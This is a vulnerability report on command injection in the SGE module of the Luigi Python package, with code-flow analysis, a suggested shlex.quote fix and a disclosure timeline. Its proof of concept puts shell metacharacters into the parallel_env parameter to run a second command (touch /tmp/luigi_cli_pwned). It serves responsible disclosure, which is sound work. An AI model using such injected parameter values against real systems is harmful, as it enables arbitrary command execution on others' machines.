# Vulnerability Report: Command Injection in Luigi SGE Module

## Report Information

| Field              | Value                      |
| ------------------ | -------------------------- |
| Date               | April 2026                 |
| Reporter           | Marcos Pantoja             |
| Vulnerability Type | Command Injection (CWE-78) |
| Severity           | High                       |

---

## Package Information

|Field|Value|
|---|---|
|Package|luigi|
|PyPI|https://pypi.org/project/luigi/|
|GitHub|https://github.com/spotify/luigi|
|Maintainer|Spotify|
|Vulnerable File|`luigi/contrib/sge.py`|
|Affected Versions|All versions (tested on latest)|

---

## Summary

A command injection vulnerability exists in Luigi's SGE (Sun Grid Engine) module. User-controlled parameters such as `parallel_env` and `job_name` are passed to `subprocess.check_output()` with `shell=True` and no sanitization. An attacker who can set these parameters via config file or command line can execute arbitrary shell commands.

---

## Vulnerability Details

### Source (User Input)

```python
parallel_env = luigi.Parameter(default='orte', significant=False)
```

`luigi.Parameter()` allows users to set this value via:

- Config file (`luigi.cfg`)
- Command line arguments (`--parallel-env`)
- Python code

### Sink (Dangerous Function)

```python
output = subprocess.check_output(submit_cmd, shell=True)
```

### Vulnerable Code Flow

**Step 1:** User sets parameter

```python
parallel_env = 'orte"; touch /tmp/pwned #'
```

**Step 2:** Parameter passed to command builder

```python
submit_cmd = _build_qsub_command(
    job_str, 
    self.task_family, 
    self.outfile,
    self.errfile, 
    self.parallel_env,  # <-- User input
    self.n_cpu
)
```

**Step 3:** Command built with no sanitization

```python
def _build_qsub_command(cmd, job_name, outfile, errfile, pe, n_cpu):
    qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
    return qsub_template.format(
        cmd=cmd, 
        job_name=job_name, 
        outfile=outfile, 
        errfile=errfile,
        pe=pe,  # <-- Inserted directly, no sanitization
        n_cpu=n_cpu
    )
```

**Step 4:** Command executed with shell=True

```python
output = subprocess.check_output(submit_cmd, shell=True)
```

---

## Static Analysis

### Visual Flow

```
┌─────────────────────────────────────────┐
│ parallel_env = luigi.Parameter()        │ ← User sets via CLI or config
└──────────────────┬──────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────┐
│ _build_qsub_command(pe=parallel_env)    │ ← No sanitization
└──────────────────┬──────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────┐
│ qsub_template.format(pe=pe)             │ ← String formatting
└──────────────────┬──────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────┐
│ subprocess.check_output(cmd, shell=True)│ ← Command execution (SINK)
└─────────────────────────────────────────┘
```

---

## Dynamic Analysis

### 1. Basic Command Execution

First, subprocess behavior was validated to confirm how `shell=True` interprets input.

```python
import subprocess

output = subprocess.check_output("echo hello", shell=True)
print(output.decode())
```

**Output:**

```
hello
```

### 2. Metacharacter Interpretation

Verified that shell metacharacters (`;`) are interpreted, allowing multiple commands.

```python
import subprocess

output = subprocess.check_output("echo hello; echo injected", shell=True)
print(output.decode())
```

**Output:**

```
hello
injected
```

### 3. Simulated Injection via Luigi-Style Code Structure

Tested the same pattern as Luigi's SGE task runner.

```python
import subprocess

pe = 'orte; echo Injected'
cmd = f"echo job | qsub -pe {pe} 4"
print(cmd)

subprocess.check_output(cmd, shell=True)
```

**Constructed command:**

```
echo job | qsub -pe orte; echo Injected 4
```

**Output:**

```
/bin/sh: 1: qsub: not found
Injected 4
```

The injected command executed despite `qsub` not being installed.

---

## Proof of Concept

### End-to-End via Luigi CLI

**Task script (`test_sge_cli.py`):**

```python
from luigi.contrib.sge import SGEJobTask
import luigi

class VulnerableTask(SGEJobTask):
    def work(self): 
        pass
    def output(self): 
        return luigi.LocalTarget('/tmp/vulnerable_task_output')
```

**CLI invocation with injected parameter:**

```bash
python3 test_sge_cli.py VulnerableTask \
    --parallel-env 'orte; touch /tmp/luigi_cli_pwned #' \
    --local-scheduler
```

**How the injection works:**

- The `;` terminates the `qsub` call early
- `touch /tmp/luigi_cli_pwned` runs as a separate shell command
- The `#` comments out the remaining arguments

**Full output:**

```
INFO: [pid 18066] Worker ... running   VulnerableTask()
DEBUG: qsub command:
echo python .../sge_runner.py "/tmp/tmpb8vqr606" "..." | qsub -o ":/tmp/tmpb8vqr606/job.out" -e ":/tmp/tmpb8vqr606/job.err" -V -r y -pe orte; touch /tmp/luigi_cli_pwned # 2 -N VulnerableTask
/bin/sh: 1: qsub: not found
ERROR: [pid 18066] Worker ... failed    VulnerableTask()
```

**Verification:**

```bash
$ ls /tmp/luigi_cli_pwned
/tmp/luigi_cli_pwned   # File created by the injected command
```

The payload executed despite Luigi reporting the task as failed.

---

## Impact

An attacker who can control Luigi parameters (via config file, command line, or code) can:

- Execute arbitrary shell commands on the system
- Read/write/delete files
- Establish reverse shells
- Pivot to other systems

### Attack Scenarios

1. **Shared HPC Clusters:** Multiple users share luigi.cfg
2. **Web Interfaces:** Web apps that pass user input to Luigi tasks
3. **CI/CD Pipelines:** Config files pulled from untrusted sources

---

## Affected Parameters

|Parameter|User Controlled?|Injectable?|
|---|---|---|
|`parallel_env`|Yes (`luigi.Parameter`)|Yes|
|`job_name`|Yes (from `task_family`)|Yes|
|`outfile`|Maybe|Yes|
|`errfile`|Maybe|Yes|
|`n_cpu`|Yes (`luigi.IntParameter`)|No (integer)|

---

## Recommended Fix

Use `shlex.quote()` to sanitize all inputs before inserting into the command string:

```python
import shlex

def _build_qsub_command(cmd, job_name, outfile, errfile, pe, n_cpu):
    qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
    return qsub_template.format(
        cmd=shlex.quote(cmd),
        job_name=shlex.quote(job_name),
        outfile=shlex.quote(outfile),
        errfile=shlex.quote(errfile),
        pe=shlex.quote(pe),
        n_cpu=n_cpu
    )
```

Alternatively, use `subprocess.Popen` with a list of arguments and `shell=False`.

---

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Luigi Documentation](https://luigi.readthedocs.io/)
- [Python subprocess documentation](https://docs.python.org/3/library/subprocess.html)

---

## Timeline

|Date|Action|
|---|---|
|April 2026|Vulnerability discovered|
|April 2026|Report submitted to Spotify|
|TBD|Vendor response|
|TBD|Fix released|
|TBD|Public disclosure|